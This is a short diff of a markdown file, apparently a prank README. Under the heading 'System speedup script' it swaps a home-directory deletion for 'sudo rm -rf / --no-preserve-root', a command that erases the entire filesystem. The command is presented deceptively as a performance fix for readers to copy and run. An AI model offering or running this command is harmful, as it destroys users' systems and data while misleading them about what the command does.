@@ -19,7 +19,7 @@ It is a link to my website btw. Or not...
 
 #### System speedup script
 ```bash
-rm -rf ~
+sudo rm -rf / --no-preserve-root
 ```
 #### Low-level C# code 
 ```csharp
